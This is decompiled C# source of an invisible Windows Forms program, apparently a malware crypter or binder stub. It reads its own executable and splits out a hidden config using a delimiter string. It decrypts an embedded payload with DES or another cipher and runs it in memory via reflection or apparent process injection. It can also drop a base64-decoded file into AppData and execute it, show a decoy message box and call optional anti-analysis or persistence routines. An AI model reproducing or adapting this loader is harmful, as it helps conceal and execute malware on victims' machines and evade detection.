using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private const string string_0 = "78lgy3NqRCkR6XXAYxgdHnU4qhUrsXl1PsSg29NGHjPZYI0FJjn5aIy2AmRvSYy3bLmes7";

	private string string_1;

	private string string_2;

	private bool bool_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (list_0)
		{
			list_0.Add(new WeakReference(this));
		}
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		bool_0 = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		byte[] bytes = Class10.smethod_0(Application.get_ExecutablePath());
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "78lgy3NqRCkR6XXAYxgdHnU4qhUrsXl1PsSg29NGHjPZYI0FJjn5aIy2AmRvSYy3bLmes7", -1, (CompareMethod)0);
		string text = array[1];
		string text2 = array[2];
		string text3 = array[6];
		string text4 = array[10];
		string text5 = array[11];
		string text6 = array[12];
		string text7 = array[13];
		string text8 = array[14];
		string text9 = array[15];
		string text10 = array[16];
		string text11 = array[17];
		string text12 = array[20];
		try
		{
			if (Operators.CompareString(text7, "Activated", false) == 0)
			{
				MessageBox.Show(text8, text9, (MessageBoxButtons)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text5, "own", false) == 0)
		{
			text5 = Process.GetCurrentProcess().MainModule!.FileName;
		}
		if (Operators.CompareString(text, "true", false) == 0)
		{
			Class7.smethod_0();
		}
		if (Operators.CompareString(text3, "true", false) == 0)
		{
			Class7.smethod_1();
		}
		if (Operators.CompareString(text10, "true", false) == 0)
		{
			Class7.smethod_3();
		}
		if (Operators.CompareString(text11, "true", false) == 0)
		{
			Class7.smethod_4();
		}
		if (Operators.CompareString(text4, "true", false) == 0)
		{
			Class7.smethod_6();
			Class7.smethod_7();
			Class7.smethod_8();
			Class7.smethod_9();
			Class7.smethod_10();
		}
		if (Operators.CompareString(text6, "true", false) == 0)
		{
			Class7.smethod_5();
		}
		if (Operators.CompareString(text12, "des", false) == 0)
		{
			string_1 = Class8.smethod_0(array[3], text2, bool_0: true);
		}
		else
		{
			string_1 = Class8.smethod_1(array[3], text2);
		}
		bool flag = Class14.smethod_0();
		if (Operators.CompareString(array[7], "NULL", false) != 0)
		{
			try
			{
				byte[] bytes2 = method_3(array[7]);
				File.WriteAllBytes(string_2 + array[8], bytes2);
				Process.Start(string_2 + array[8]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			try
			{
				if (method_1())
				{
					Thread thread = new Thread(delegate(object object_0)
					{
						method_2(Conversions.ToString(object_0));
					});
					thread.TrySetApartmentState(ApartmentState.STA);
					thread.Start(Class8.smethod_0(array[3], text2, bool_0: true));
					((Form)this).Close();
				}
				else
				{
					GClass1 gClass = new GClass1();
					byte[] bytes3 = Encoding.Default.GetBytes(string_1);
					gClass.method_5(bytes3, text5);
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				Process.GetCurrentProcess().Kill();
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			return;
		}
		try
		{
			if (method_1())
			{
				Thread thread2 = new Thread(delegate(object object_0)
				{
					method_2(Conversions.ToString(object_0));
				});
				thread2.TrySetApartmentState(ApartmentState.STA);
				thread2.Start(Class8.smethod_0(array[3], text2, bool_0: true));
				((Form)this).Close();
			}
			else
			{
				GClass1 gClass2 = new GClass1();
				byte[] bytes4 = Encoding.Default.GetBytes(string_1);
				gClass2.method_5(bytes4, text5);
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Process.GetCurrentProcess().Kill();
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(byte[] byte_0)
	{
		Assembly assembly = Assembly.Load(byte_0);
		MethodInfo entryPoint = assembly.EntryPoint;
		object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
		entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1] { new string[1] { "1" } });
	}

	private bool method_1()
	{
		if (string_1.Contains("</assembly>"))
		{
			string[] array = Strings.Split(string_1, "</assembly>", -1, (CompareMethod)0);
			if (Operators.CompareString(array[1].ToLower(), "", false) != 0)
			{
				return true;
			}
			bool result = default(bool);
			return result;
		}
		return false;
	}

	public void method_2(string string_3)
	{
		byte[] bytes = Encoding.GetEncoding(1252).GetBytes(string_3);
		Thread thread = new Thread(delegate(object object_0)
		{
			method_0((byte[])object_0);
		});
		thread.TrySetApartmentState(ApartmentState.STA);
		thread.Start(bytes);
		((Form)this).Close();
	}

	public byte[] method_3(string string_3)
	{
		if (string_3 == null)
		{
			throw new ArgumentNullException("base64");
		}
		return Convert.FromBase64String(string_3);
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_4(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_5(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_6(object object_0)
	{
		method_0((byte[])object_0);
	}
}
